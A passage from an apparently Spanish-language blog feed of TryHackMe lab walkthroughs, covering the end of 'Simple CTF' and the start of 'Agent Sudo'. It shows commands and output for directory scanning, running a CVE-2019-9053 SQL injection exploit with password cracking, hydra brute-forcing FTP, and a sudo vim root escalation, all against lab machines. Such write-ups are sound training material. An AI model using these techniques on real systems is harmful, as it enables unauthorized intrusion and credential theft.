Name &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;10.10.235.105:root&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;: anonymous
&lt;span class=&#34;m&#34;&gt;230&lt;/span&gt; Login successful.
Remote system &lt;span class=&#34;nb&#34;&gt;type&lt;/span&gt; is UNIX.
Using binary mode to transfer files.
ftp&amp;gt; ls
&lt;span class=&#34;m&#34;&gt;200&lt;/span&gt; PORT &lt;span class=&#34;nb&#34;&gt;command&lt;/span&gt; successful. Consider using PASV.
&lt;span class=&#34;m&#34;&gt;150&lt;/span&gt; Here comes the directory listing.
drwxr-xr-x    &lt;span class=&#34;m&#34;&gt;2&lt;/span&gt; ftp      ftp          &lt;span class=&#34;m&#34;&gt;4096&lt;/span&gt; Aug &lt;span class=&#34;m&#34;&gt;17&lt;/span&gt; 18:24 pub
&lt;span class=&#34;m&#34;&gt;226&lt;/span&gt; Directory send OK.
ftp&amp;gt; &lt;span class=&#34;nb&#34;&gt;cd&lt;/span&gt; pub
&lt;span class=&#34;m&#34;&gt;250&lt;/span&gt; Directory successfully changed.
ftp&amp;gt; ls
&lt;span class=&#34;m&#34;&gt;200&lt;/span&gt; PORT &lt;span class=&#34;nb&#34;&gt;command&lt;/span&gt; successful. Consider using PASV.
&lt;span class=&#34;m&#34;&gt;150&lt;/span&gt; Here comes the directory listing.
-rw-r--r--    &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; ftp      ftp           &lt;span class=&#34;m&#34;&gt;166&lt;/span&gt; Aug &lt;span class=&#34;m&#34;&gt;17&lt;/span&gt; 18:24 ForMitch.txt
&lt;span class=&#34;m&#34;&gt;226&lt;/span&gt; Directory send OK.
ftp&amp;gt; get ForMitch.txt
local: ForMitch.txt remote: ForMitch.txt
&lt;span class=&#34;m&#34;&gt;200&lt;/span&gt; PORT &lt;span class=&#34;nb&#34;&gt;command&lt;/span&gt; successful. Consider using PASV.
&lt;span class=&#34;m&#34;&gt;150&lt;/span&gt; Opening BINARY mode data connection &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; ForMitch.txt &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;m&#34;&gt;166&lt;/span&gt; bytes&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;.
&lt;span class=&#34;m&#34;&gt;226&lt;/span&gt; Transfer complete.
&lt;span class=&#34;m&#34;&gt;166&lt;/span&gt; bytes received in 0.00 secs &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;953.5845 kB/s&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
ftp&amp;gt; &lt;span class=&#34;nb&#34;&gt;exit&lt;/span&gt;
&lt;span class=&#34;m&#34;&gt;221&lt;/span&gt; Goodbye.
root@aoiri:~/tryhackme/simplectf# cat ForMitch.txt 
Dammit man... you&lt;span class=&#34;s1&#34;&gt;&amp;#39;te the worst dev i&amp;#39;&lt;/span&gt;ve seen. You &lt;span class=&#34;nb&#34;&gt;set&lt;/span&gt; the same pass &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; the system user, and the password is so weak... i cracked it in seconds. Gosh... what a mess!
root@aoiri:~/tryhackme/simplectf#
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h2 id=&#34;http&#34;&gt;HTTP&lt;/h2&gt;
&lt;p&gt;Encontramos la pagina principal de Apache en el puerto http (80).&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/thm/simplectf/Screenshot_20200205_005806.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;h3 id=&#34;gobuster&#34;&gt;GOBUSTER&lt;/h3&gt;
&lt;p&gt;Utilizamos gobuster para busqueda de directorios y archivos que nos pudiesen servir.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;7
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;root@aoiri:~/tryhackme/simplectf# gobuster dir -u 10.10.235.105 -w /usr/share/wordlists/dirb/common_nofirst10.txt -t &lt;span class=&#34;m&#34;&gt;15&lt;/span&gt; -x php,html,txt -q
/index.html &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 200&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
/index.html &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 200&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
/robots.txt &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 200&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
/robots.txt &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 200&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
/server-status &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 403&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
/simple &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 301&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h4 id=&#34;simple&#34;&gt;/simple&lt;/h4&gt;
&lt;p&gt;Encontramos un CMS corriendo en la maquina especificamente &lt;strong&gt;CMS Made Simple&lt;/strong&gt;, vemos la version que esta corriendo en el footer de la pagina.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/thm/simplectf/Screenshot_20200205_010159.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;h2 id=&#34;cms-made-simple---cve-2019-9053&#34;&gt;CMS Made Simple - CVE-2019-9053&lt;/h2&gt;
&lt;p&gt;Encontramos una vulnerabilidad de Inyeccion SQL que afecta a este CMS, utilizamos el exploit para obtener el usuario y contraseña.&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://www.exploit-db.com/exploits/46635&#34;&gt;&lt;strong&gt;CMS Made Simple &amp;lt; 2.2.10 - SQL Injection&lt;/strong&gt;&lt;/a&gt;&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;7
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;python CVE-2019-9053.py -u http://10.10.2.28/simple/ --crack -w 10k-most-common.txt
 
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;+&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Salt &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; password found: 1dac0d9***fa6bb2
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;+&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Username found: mitch
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;+&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Email found: admin@admin.com
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;+&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Password found: 0c01f4468b*****a84c7eb73846e8d96
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;+&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Password cracked: ******
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;Intentamos utilizar las credenciales que encontramos en el panel de Made Simple pero no logramos iniciar sesion.&lt;/p&gt;
&lt;h2 id=&#34;ssh---user&#34;&gt;SSH - User&lt;/h2&gt;
&lt;p&gt;Utilizamos las credenciales que encontramos en el servicio SSH para poder obtener una shell y nuestra flag &lt;strong&gt;user.txt&lt;/strong&gt;.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/thm/simplectf/Screenshot_20200205_135555.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;h2 id=&#34;privilege-escalation&#34;&gt;PRIVILEGE ESCALATION&lt;/h2&gt;
&lt;p&gt;Hacemos una enumeracion sencilla con &lt;code&gt;sudo -l -l&lt;/code&gt; para listar los comandos/archivos que podemos ejecutar sin contraseña y con privilegios root, vemos a /usr/bin/vim, para obtener una shell utilizamos &lt;a href=&#34;https://gtfobins.github.io/gtfobins/vim/#sudo&#34;&gt;&lt;strong&gt;GTFOBINS&lt;/strong&gt;&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/thm/simplectf/Screenshot_20200205_140055.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Obtenemos nuestra shell con usuario root y nuestra flag &lt;strong&gt;root.txt&lt;/strong&gt;.&lt;/p&gt;
</content:encoded>
        <dc:creator>sckull</dc:creator>
        <media:content url="https://sckull.github.io/images/posts/thm/simplectf/cover.webp" medium="image"><media:title type="html">featured image</media:title></media:content>
        
        <media:content url="https://sckull.github.io/images/posts/thm/simplectf/cover.webp" medium="image"><media:title type="html">meta image</media:title></media:content>
        
          
            
              <category>linux</category>
            
          
        
        
          
            
              <category>tryhackme</category>
            
          
        
        
      </item>
      
      <item>
        <title>TryHackMe - Agent Sudo</title>
        <link>https://sckull.github.io/posts/agent_sudo/</link>
        <pubDate>Tue, 04 Feb 2020 00:00:00 +0000</pubDate>
        
        <atom:modified>Tue, 04 Feb 2020 00:00:00 +0000</atom:modified>
        <guid>https://sckull.github.io/posts/agent_sudo/</guid>
        <description>Agent Sudo es una maquina de TryHackMe aqui encontrarás la solucion para obtener la flag user.txt y root.</description>
        <content:encoded>&lt;p&gt;Agent Sudo es una maquina de TryHackMe aqui encontrarás la solucion para obtener la flag user.txt y root.txt.&lt;/p&gt;




  



  &lt;div class=&#34;featured-image__wrapper&#34;&gt;
    &lt;img src=&#34;https://sckull.github.io/images/posts/thm/agentsudo/cover.webp&#34; alt=&#34;featured image&#34; class=&#34;featured-image&#34; style=&#34;width: ;height: ;&#34;&gt;
  &lt;/div&gt;

&lt;h3 id=&#34;informacion-de-la-maquina&#34;&gt;Informacion de la Maquina&lt;/h3&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;Titulo&lt;/th&gt;
&lt;th&gt;Agent Sudo&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;Info&lt;/td&gt;
&lt;td&gt;You found a secret server located under the deep sea. Your task is to hack inside the server and reveal the truth.&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Puntos&lt;/td&gt;
&lt;td&gt;3311&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Dificultad&lt;/td&gt;
&lt;td&gt;Facil&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Maker&lt;/td&gt;
&lt;td&gt;&lt;a href=&#34;https://tryhackme.com/p/DesKel&#34;&gt;Deskel&lt;/a&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;br&gt;
&lt;hr&gt;
&lt;h2 id=&#34;nmap&#34;&gt;NMAP&lt;/h2&gt;
&lt;p&gt;Escaneo de puertos tcp/udp, nmap nos muestra el puerto http (80), el puerto ssh (22) y el puerto ftp (21) abiertos.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;18
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# Nmap 7.80 scan initiated Tue Feb  4 21:35:26 2020 as: nmap -p- -sV -sC -T4 -o nmap_scan 10.10.235.45&lt;/span&gt;
Nmap scan report &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; 10.10.235.45
Host is up &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;0.20s latency&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;.
Not shown: &lt;span class=&#34;m&#34;&gt;65532&lt;/span&gt; closed ports
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Ubuntu Linux&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; protocol 2.0&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; ssh-hostkey: 
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;   &lt;span class=&#34;m&#34;&gt;2048&lt;/span&gt; ef:1f:5d:04:d4:77:95:06:60:72:ec:f0:58:f2:cc:07 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;RSA&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;   &lt;span class=&#34;m&#34;&gt;256&lt;/span&gt; 5e:02:d1:9a:c4:e7:43:06:62:c1:9e:25:84:8a:e7:ea &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;ECDSA&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;_  &lt;span class=&#34;m&#34;&gt;256&lt;/span&gt; 2d:00:5c:b9:fd:a8:c8:d8:80:e3:92:4f:8b:4f:18:e2 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;ED25519&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
80/tcp open  http    Apache httpd 2.4.29 &lt;span class=&#34;o&#34;&gt;((&lt;/span&gt;Ubuntu&lt;span class=&#34;o&#34;&gt;))&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;_http-server-header: Apache/2.4.29 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Ubuntu&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;_http-title: Annoucement
Service Info: OSs: Unix, Linux&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
&lt;span class=&#34;c1&#34;&gt;# Nmap done at Tue Feb  4 21:43:52 2020 -- 1 IP address (1 host up) scanned in 506.11 seconds&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h2 id=&#34;http&#34;&gt;HTTP&lt;/h2&gt;
&lt;h3 id=&#34;whatweb&#34;&gt;WHATWEB&lt;/h3&gt;
&lt;p&gt;Esca corriendo una pagina sobre apache 2.4.29.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;root@aoiri:~/tryhackme/agentsudo# whatweb http://10.10.235.45
http://10.10.235.45 &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;m&#34;&gt;200&lt;/span&gt; OK&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Apache&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;2.4.29&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;, Country&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;RESERVED&lt;span class=&#34;o&#34;&gt;][&lt;/span&gt;ZZ&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;, HTML5, HTTPServer&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;Ubuntu Linux&lt;span class=&#34;o&#34;&gt;][&lt;/span&gt;Apache/2.4.29 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Ubuntu&lt;span class=&#34;o&#34;&gt;)]&lt;/span&gt;, IP&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;10.10.235.45&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;, Title&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;Annoucement&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
root@aoiri:~/tryhackme/agentsudo#
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h3 id=&#34;gobuster&#34;&gt;GOBUSTER&lt;/h3&gt;
&lt;p&gt;Utilizamos gobuster para busqueda de directorios y archivos que nos pudiesen servir.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;root@aoiri:~/tryhackme/agentsudo# gobuster dir -u 10.10.235.45 -w /usr/share/wordlists/dirb/common_nofirst10.txt -x php,html,txt -t &lt;span class=&#34;m&#34;&gt;15&lt;/span&gt; -q
/index.php &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 200&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
/index.php &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 200&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
/server-status &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 403&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h3 id=&#34;http-web&#34;&gt;HTTP Web&lt;/h3&gt;
&lt;p&gt;Al visitar la pagina encontramos un mensaje, en el cual nos mencionan el user-agent y que debemos de utilizar nuestro nombre en codigo para acceder.&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/thm/agentsudo/Screenshot_20200204_215904.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Utilizamos &amp;lsquo;R&amp;rsquo; en User-Agent y nos muestra un mensaje distinto.&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/thm/agentsudo/Screenshot_20200204_220129.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Utilizamos BURPSUITE para poder realizar distintas peticiones con el &amp;lsquo;User-Agent&amp;rsquo; utilizando como payloads:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span class=&#34;o&#34;&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span class=&#34;kn&#34;&gt;import&lt;/span&gt; &lt;span class=&#34;nn&#34;&gt;string&lt;/span&gt;
&lt;span class=&#34;o&#34;&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;print&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;string&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;printable&lt;/span&gt;
&lt;span class=&#34;mo&#34;&gt;01234567&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;89&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;!&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;#$%&amp;amp;&amp;#39;()*+,-./:;&amp;lt;=&amp;gt;?@[\]^_`{|}~&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;Encontramos que existe el &lt;code&gt;Agente C&lt;/code&gt;, el contenido solo puede ser visto en nuestro navegador ya que nos redirige hacia otra pagina.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/thm/agentsudo/Screenshot_20200204_220900.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Agente C:&lt;br /&gt;
Nos muestra un mensaje que muestra el nombre del agente &amp;lsquo;chris&amp;rsquo;.&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/thm/agentsudo/Screenshot_20200204_220951.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;h2 id=&#34;ftp&#34;&gt;FTP&lt;/h2&gt;
&lt;p&gt;Para poder acceder al servicio de FTP utilizamos hydra para realizar fuerza bruta a la contraseña con el usuario chris.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;root@aoiri:~/tryhackme/agentsudo# hydra -l chris -P /usr/share/wordlists/rockyou.txt ftp://10.10.235.45
Hydra v9.0 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;c&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;2019&lt;/span&gt; by van Hauser/THC - Please &lt;span class=&#34;k&#34;&gt;do&lt;/span&gt; not use in military or secret service organizations, or &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; illegal purposes.

Hydra &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;https://github.com/vanhauser-thc/thc-hydra&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; starting at 2020-02-04 22:13:47
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;DATA&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; max &lt;span class=&#34;m&#34;&gt;16&lt;/span&gt; tasks per &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; server, overall &lt;span class=&#34;m&#34;&gt;16&lt;/span&gt; tasks, &lt;span class=&#34;m&#34;&gt;14344399&lt;/span&gt; login tries &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;l:1/p:14344399&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;, ~896525 tries per task
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;DATA&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; attacking ftp://10.10.235.45:21/
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;STATUS&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; 240.00 tries/min, &lt;span class=&#34;m&#34;&gt;240&lt;/span&gt; tries in 00:01h, &lt;span class=&#34;m&#34;&gt;14344159&lt;/span&gt; to &lt;span class=&#34;k&#34;&gt;do&lt;/span&gt; in 996:08h, &lt;span class=&#34;m&#34;&gt;16&lt;/span&gt; active
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;21&lt;span class=&#34;o&#34;&gt;][&lt;/span&gt;ftp&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; host: 10.10.235.45   login: chris   password: *******
&lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; of &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; target successfully completed, &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; valid password found
Hydra &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;https://github.com/vanhauser-thc/thc-hydra&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; finished at 2020-02-04 22:14:56
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;Al acceder nos encontramos con varios archivos:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
